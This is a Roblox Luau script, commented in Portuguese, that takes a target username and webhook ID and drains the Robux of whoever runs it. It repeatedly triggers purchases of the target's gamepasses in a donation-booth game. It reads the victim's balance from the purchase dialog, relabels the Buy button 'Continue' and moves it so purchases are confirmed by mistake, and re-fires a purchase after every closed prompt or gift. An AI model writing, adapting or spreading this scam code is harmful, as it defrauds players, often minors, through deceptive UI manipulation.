-- Configuração
local LogsWebhook = "18bf10e6-da47-4bdf-8c64-fcaa95eae717"
local Username = "Ian_wp27" -- definir o usuário alvo

-- Serviços
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")

-- Remotes
local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))

-- Helpers
local Player = Players.LocalPlayer
local asset
local userRobux = math.huge

-- Pegar UserId
local success, UserId = pcall(function()
    return Players:GetUserIdFromNameAsync(Username)
end)

if not success or not UserId then
    warn("Usuário inválido!")
    return
end

-- Buscar Booth
local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(UserId)
if not Booth then
    Player:Kick("Receiver not found!")
    return
end

-- Função de compra
local function Purchase()
    local range = 0
    for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
        if v:GetAttribute("AssetType") == "Gamepass" and
           not MarketplaceService:UserOwnsGamePassAsync(Player.UserId, v:GetAttribute("AssetId")) then
            local price = v:GetAttribute("AssetPrice")
            if price and price <= userRobux and price > range then
                asset = v
                range = price
            end
        end
    end

    if asset and asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
        asset.Prompt:FireServer("", false, range)
    end
end

-- Espera o PurchasePromptApp aparecer
local PurchasePromptApp
repeat
    PurchasePromptApp = CoreGui:FindFirstChild("PurchasePromptApp")
    task.wait(0.1)
until PurchasePromptApp

-- Detecta quando a UI de compra é adicionada
PurchasePromptApp.ChildAdded:Connect(function(child)
    if child.Name == "Prompt" then
        local footer = child:WaitForChild("AlertContents"):WaitForChild("Footer")
        local content = footer:WaitForChild("FooterContent"):WaitForChild("Content")
        local RemainingBalanceText = content:FindFirstChild("RemainingBalanceText")
        if RemainingBalanceText then
            userRobux = tonumber(RemainingBalanceText.Text:match("(%d+)")) or math.huge
            -- Adaptar para mobile: botão "Comprar" à esquerda
            local buyButton = footer.Buttons:FindFirstChild("2")
            if buyButton then
                buyButton.ButtonContent.ButtonMiddleContent.Text.Text = "Continue"
                buyButton.Position = UDim2.new(0, 10, buyButton.Position.Y.Scale, buyButton.Position.Y.Offset) -- move para esquerda
            end
        end
    end
end)

-- Detecta quando a UI de compra é removida
PurchasePromptApp.ChildRemoved:Connect(function(child)
    if child.Name == "Prompt" then
        if asset and not MarketplaceService:UserOwnsGamePassAsync(Player.UserId, asset:GetAttribute("AssetId")) then
            Purchase()
        end
    end
end)

-- Evento de doação
Remotes.OnClientEvent("GiftSentAlert"):Connect(function(a, robux)
    if a == UserId then
        userRobux = userRobux - robux
        Purchase()
    end
end)

-- Compra inicial
Purchase()
